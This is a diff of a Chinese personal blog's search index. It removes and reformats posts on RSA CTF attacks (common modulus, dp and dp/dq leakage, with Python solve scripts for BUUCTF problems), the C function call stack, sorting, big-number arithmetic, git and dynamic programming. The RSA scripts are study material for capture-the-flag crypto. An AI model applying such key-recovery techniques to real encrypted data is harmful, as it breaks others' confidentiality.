class="line">e2=<span class="number">2767</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span></span><br><span class="line">c2=<span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_,x,y=gmpy2.gcdext(e1,e2)<span class="comment">#拓展欧几里得算法，得到x,y</span></span><br><span class="line"><span class="built_in">print</span>(gcd(e1,e2))<span class="comment">#查看e1,e2是否互质</span></span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,y,n)*<span class="built_in">pow</span>(c2,x,n)%n<span class="comment">#这里我就理解为x,y是密文解密的私钥了</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="dp泄露">dp泄露</h4>
-<p>特征：提供了dp，e，n，c</p>
-<p>例题：BUUCTF RSA2</p>
-<p>解析：这个题有点抽象，n不够大的情况下可以直接分解为p,q，然后求解私钥就能解了，没用到dp。</p>
-<p>当然我们先知道dp是什么，$dp=d%(p-1)$ 。随后推导可以得到：$e<em>dp=1+k</em>(p-1)$。随后使用爆破求k的方式即可求出p，随后求出q，最后就能得到密钥d。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"> </span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-<h4 id="dp-dq泄露">dp,dq泄露</h4>
-<p>特征：给出了dp,dq,则不需要e即可得出明文</p>
-<p>例题：BUUCTF RSA1</p>
-<p>解析：</p>
-<p>$m1 = c^{dp}modp$</p>
-<p>$m2 = c^{dq}modq$</p>
-<p>$m = (((m1-m2)*I)%p)*q+m2$</p>
-<p>I表示p,q的逆元</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">i=gmpy2.invert(p,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>,i)</span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dq,q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=(((m1-m2)*i)%q)*p+m2</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>函数调用栈</title>
     <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
     <content><![CDATA[<p>c语言调用函数时栈的情况</p>
 <span id="more"></span>
-<h4 id="函数开始">函数开始</h4>
-<p>如图：</p>
+<h4 id="函数开始"><a href="#函数开始" class="headerlink" title="函数开始"></a>函数开始</h4><p>如图：</p>
 <p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
 <p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
-<h4 id="函数结束">函数结束</h4>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<h4 id="函数结束"><a href="#函数结束" class="headerlink" title="函数结束"></a>函数结束</h4><p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
 <p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
 ]]></content>
   </entry>
   <entry>
     <title>基础算法01</title>
     <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
-    <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
+    <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
 <p>主要是：排序总结，高精度总结。</p>
 <span id="more"></span>
-<h3 id="排序模板">排序模板</h3>
-<h4 id="冒泡排序">冒泡排序</h4>
-<p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
-<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，…的排序，至此排序完成。</p>
+<h3 id="排序模板"><a href="#排序模板" class="headerlink" title="排序模板"></a>排序模板</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
+<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，……的排序，至此排序完成。</p>
 <p>核心代码如下:</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
-<h4 id="快速排序">快速排序</h4>
-<p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
+<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
 <p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
 <p>核心代码大同小异，这里我就摆一种：</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>排序就先摆两个吧，有空了再贴(画饼</p>
-<h3 id="高精度计算">高精度计算</h3>
-<h4 id="a-b高精度">a+b高精度</h4>
-<p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
+<h3 id="高精度计算"><a href="#高精度计算" class="headerlink" title="高精度计算"></a>高精度计算</h3><h4 id="a-b高精度"><a href="#a-b高精度" class="headerlink" title="a+b高精度"></a>a+b高精度</h4><p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
 <p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
 <p><strong>实现代码：</strong></p>
 <p>读入数组部分：</p>
@@ -499,8 +454,7 @@
 <p>全部代码：</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
-<h4 id="a-b高精度，a-b高精度">a-b高精度，a*b高精度</h4>
-<p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
+<h4 id="a-b高精度，a-b高精度"><a href="#a-b高精度，a-b高精度" class="headerlink" title="a-b高精度，a*b高精度"></a>a-b高精度，a*b高精度</h4><p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
 <p>实现代码：</p>
 <p>减法：</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -517,69 +471,11 @@
       </tags>
   </entry>
   <entry>
-    <title>git的基本用法</title>
-    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>git命令行的基本用法：</p>
-<span id="more"></span>
-<h3 id="Git-commit">Git commit</h3>
-<p>提交内容，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
-<p>输入指令:<strong>git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
-<h3 id="Git-branch">Git branch</h3>
-<p>形成一个新的分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
-<p>输入指令：<strong>git branch newImage</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
-<h3 id="Git-merge">Git merge</h3>
-<p>合并分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
-<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
-<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
-<h3 id="Git-rebase">Git rebase</h3>
-<p>由并行状态合并为线性状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
-<p>输入指令：<strong>git rebase main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
-<p><strong>git rebase bugFix</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
-<h3 id="Git-branch-f-XXX-HEAD-n">Git branch -f XXX HEAD~n</h3>
-<p>修改main分支到前几次的提交状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
-<p>指令<strong>git branch -f main HEAD~3</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
-<h3 id="Git-cherry-pick">Git cherry-pick</h3>
-<p>将后交的状态复制到main分支中，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
-<p>指令<strong>git cherry-pick c2 c4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
-<h3 id="Git-rebase-2">Git rebase</h3>
-<p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
-<p>指令<strong>git rebase -i HEAD~4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>乱七八糟的东东</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>大牛的博客(学习用)</title>
     <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
+    <content><![CDATA[<p> 这里收录一些大佬的博客，可以跟着学习：</p>
 <span id="more"></span>
-<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
-<p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<h2 id="Pwn手师傅们的博客"><a href="#Pwn手师傅们的博客" class="headerlink" title="Pwn手师傅们的博客"></a>Pwn手师傅们的博客</h2><p><a href="https://godjj.top/">https://godjj.top/</a></p>
 <p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
 <p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
 <p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
@@ -587,92 +483,48 @@
 ]]></content>
   </entry>
   <entry>
-    <title>基础算法02</title>
-    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
-    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
-<span id="more"></span>
-<h4 id="例题一">例题一</h4>
-<p>先来看一道很简单的例题：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
-<p>具体要求如下：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
-<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
-<p>核心代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>ac代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span 